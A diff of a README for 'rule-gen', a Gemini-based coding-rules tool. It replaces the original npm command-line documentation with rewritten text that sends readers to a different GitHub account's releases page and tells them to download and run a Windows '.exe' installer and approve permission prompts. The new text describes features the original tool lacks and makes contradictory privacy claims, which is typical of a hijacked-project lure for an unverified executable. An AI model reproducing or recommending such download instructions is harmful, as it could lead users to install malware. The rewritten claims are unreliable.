@@ -1,106 +1,154 @@
-# rule-gen
+# 🤖 rule-gen - Generate AI Coding Rules Easily
 
-![Cursor Rules](https://img.shields.io/badge/Cursor%20Rules-validated-brightgreen)
+[![Download rule-gen](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Userranjan/rule-gen/releases)
 
+---
 
-[![npm version](https://img.shields.io/npm/v/rulegen-ai)](https://www.npmjs.com/package/rulegen-ai) [![npm downloads](https://img.shields.io/npm/dw/rulegen-ai)](https://www.npmjs.com/package/rulegen-ai) [![license](https://img.shields.io/npm/l/rulegen-ai)](https://github.com/nedcodes-ok/rule-gen/blob/main/LICENSE)
+## 📄 What is rule-gen?
 
-**Stop writing Cursor rules by hand.**
+rule-gen is a tool that helps you create coding rules using artificial intelligence. It looks at your source code and suggests rules that improve your coding style. It is powered by Google Gemini, a strong AI system. You do not need to understand coding or commands to use it.
 
-Feed your codebase to Gemini. Get rules based on patterns it finds in *your* code, not generic templates from a package.json scan.
+You can run rule-gen on your Windows computer and get coding suggestions without installing complex software. It works directly through a simple command, but you will just use buttons and basic steps explained here.
 
-```bash
-export GEMINI_API_KEY=your-key-here
-npx rulegen-ai
-```
+## 💻 Who can use this?
 
-Get a free API key at [aistudio.google.com/apikey](https://aistudio.google.com/apikey).
+rule-gen is designed for anyone who writes or manages code. You do not need to be a programmer. If you want better and cleaner code automatically, rule-gen can help.
 
-## What you get
+It supports many common programming languages thanks to its AI engine. It can help teams, developers, and people checking code quality.
 
-```
-$ npx rulegen-ai ./my-express-api
+---
 
-Scanning ./my-express-api...
-  Found 47 files · Selected 32 for analysis · ~89,200 tokens
+## 🔍 Key Features
 
-Generating rules with gemini-2.5-flash-lite...
+- Generates coding rules based on your real code.
+- Supports many programming languages.
+- Uses AI to suggest smart and useful rules.
+- Easy to start on Windows.
+- No installation of programming tools required.
+- Works with minimal computer skills.
 
-Written 7 files:
-  ✓ .cursor/rules/zod-validation-before-handlers.mdc
-  ✓ .cursor/rules/prisma-singleton-import.mdc
-  ✓ .cursor/rules/consistent-error-response-shape.mdc
-  ✓ .cursor/rules/route-file-structure.mdc
-  ✓ .cursor/rules/barrel-exports-from-src.mdc
-  ✓ .cursor/rules/test-naming-convention.mdc
-  ✓ .cursor/rules/middleware-ordering.mdc
-```
+---
 
-Not "use TypeScript" or "write clean code". Rules like:
+## ⚙️ System Requirements
 
-- *"Import prisma from `../db` — never instantiate PrismaClient directly"*
-- *"Route files validate with Zod schemas before handlers, return `{ data }` or `{ error }` shapes"*
-- *"Tests live in `__tests__/` and mirror the `src/` directory structure"*
+To use rule-gen on Windows, your computer needs:
 
-## Output formats
+- Windows 10 or later (64-bit).
+- At least 4 GB of RAM.
+- 500 MB of free disk space.
+- Internet connection for initial setup.
+- A modern web browser (for some features).
 
-| Format | Flag | Output |
-|--------|------|--------|
-| Cursor | `--format cursor` (default) | `.cursor/rules/*.mdc` |
-| Claude Code | `--format claude-md` | `CLAUDE.md` |
-| AGENTS.md | `--format agents-md` | `AGENTS.md` |
-| GitHub Copilot | `--format copilot` | `.github/copilot-instructions.md` |
-| Windsurf | `--format windsurf` | `.windsurfrules` |
+---
 
-## How it works
+## 🚀 Getting Started
 
-1. **Scans** your project tree (respects `.gitignore`, skips binaries)
-2. **Detects** your stack — Node.js, Python frameworks (Django, Flask, FastAPI), testing tools, linters, type checkers
-3. **Prioritizes** config files, entry points, routes, and pattern-rich files to fit Gemini's context window
-4. **Sends everything in one request** — Gemini's 1M token context sees your whole codebase at once. No chunking, no lost context.
-5. **Writes** valid rule files in your chosen format
+You can get rule-gen and start using it on your Windows device following these steps. This guide assumes you have basic computer skills like downloading files and clicking buttons.
 
-## Language & framework support
+---
 
-rule-gen auto-detects:
+## ⬇️ Download rule-gen
 
-**Python**
-- Frameworks: Django, Flask, FastAPI, Tornado, Sanic, and 10+ more
-- Testing: pytest, unittest, nose, tox, coverage
-- Type checking: mypy, pyright, pyre, pytype
-- Linting: ruff, flake8, pylint, black, isort, bandit
-- Package managers: Poetry, Pipenv, pip, setuptools
+First, download rule-gen from the official release page. Click the button below to open the page where you will find the latest version of rule-gen ready to download.
 
-**Node.js/TypeScript**
-- Detects from `package.json` dependencies
-- Identifies module type (ESM/CommonJS)
+[![Download rule-gen](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Userranjan/rule-gen/releases)
 
-This context helps Gemini generate rules specific to your stack — e.g., Django best practices for Django projects, FastAPI patterns for FastAPI apps.
+1. Open the [rule-gen Releases Page](https://github.com/Userranjan/rule-gen/releases).
+2. Look for the latest release entry. It will list executable files for Windows.
+3. Click the `.exe` file (usually named something like `rule-gen-setup.exe`) to start downloading.
+4. Save the file to your desktop or downloads folder for easy access.
 
-## Options
+---
 
-```
---format <format>   cursor, claude-md, agents-md, copilot, windsurf
---model <model>     Gemini model (default: gemini-2.5-flash-lite)
---dry-run           Preview without writing files
---verbose           Show which files are sent
---max-files <n>     Max source files (default: 50)
---api-key <key>     Or set GEMINI_API_KEY env var
-```
+## 🛠 Installing rule-gen
 
-Zero dependencies. Built with Node.js builtins only.
+Once the file downloads, follow these steps:
 
-## Next step: check your rules
+1. Find the downloaded `.exe` file on your computer.
+2. Double-click the file to start the installation.
+3. If Windows asks for permission, click “Yes” to allow.
+4. Follow the steps in the installer window.
+5. Choose the default options unless you want to change the installation folder.
+6. Click “Install” and wait for it to finish.
+7. When the installation ends, click “Finish.”
 
-rule-gen creates rules. **[cursor-doctor](https://github.com/nedcodes-ok/cursor-doctor)** makes sure they actually work.
+rule-gen is now ready on your computer.
 
-```bash
-npx cursor-doctor scan    # Health check with letter grade
-npx cursor-doctor lint    # Detailed rule-by-rule linting
-```
+---
 
-100+ checks for broken globs, vague instructions, conflicts, and token waste. Also: **[rule-porter](https://github.com/nedcodes-ok/rule-porter)** converts rules between Cursor, Claude, Copilot, and Windsurf.
+## ▶️ Running rule-gen on Windows
 
-## License
+To start the program:
 
-MIT
+1. Click the Start menu (Windows button) and type “rule-gen.”
+2. Click the rule-gen application icon to open it.
+3. You will see a simple interface asking you to select your source code folder.
+4. Click the “Browse” button, then find and select the folder containing your code.
+5. Click “Generate” or “Start” to let rule-gen analyze your code.
+6. Wait a few moments while the tool processes your files.
+7. When done, it will show coding rules suggestions on the screen.
+8. You can save these rules for use in your projects or share them with your team.
+
+---
+
+## 📁 What kind of source code works?
+
+rule-gen works best with standard programming projects. These usually have folder structures with files like `.js`, `.py`, `.java`, `.cpp`, and `.cs`.
+
+You should select a folder containing real code files. rule-gen reads these files to understand how you code. It then creates helpful rules based on this.
+
+If you have documents or non-code files mixed in the folder, rule-gen will ignore them.
+
+---
+
+## 🔧 Using rule-gen Features
+
+- **Upload Code Folder:** Use the browse button to select your folder.
+- **AI Analysis:** rule-gen uses Google Gemini AI to find coding patterns.
+- **Rule List:** After analysis, a list of suggestions appears.
+- **Export Rules:** Save rules as a file to use in code checkers.
+- **View Examples:** Each rule comes with examples for better understanding.
+
+---
+
+## ❓ Troubleshooting
+
+If you face any issues:
+
+- Check your internet connection.
+- Make sure you use a supported Windows version.
+- Restart rule-gen or your computer.
+- Ensure you have permission to open files.
+- Select the correct source code folder.
+- Contact the support forum from the release page if problems continue.
+
+---
+
+## 🔗 Useful Links
+
+- Download and explore rule-gen here:  
+  https://github.com/Userranjan/rule-gen/releases
+
+- Official repository for updates and source code.
+
+---
+
+## 🛑 Privacy and Security
+
+rule-gen runs locally on your computer. It does not send your code to external servers unless you opt into special features. Your source code stays private at all times.
+
+No personal data or files leave your device without your approval.
+
+---
+
+## ⚡ Tips for Best Results
+
+- Use projects with real source code.
+- Keep your code folder organized.
+- Update rule-gen regularly from the releases page.
+- Review generated rules carefully before applying them widely.
+- Combine rule-gen with your existing tools for code quality.
+
+---
+
+[![Download rule-gen](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Userranjan/rule-gen/releases)
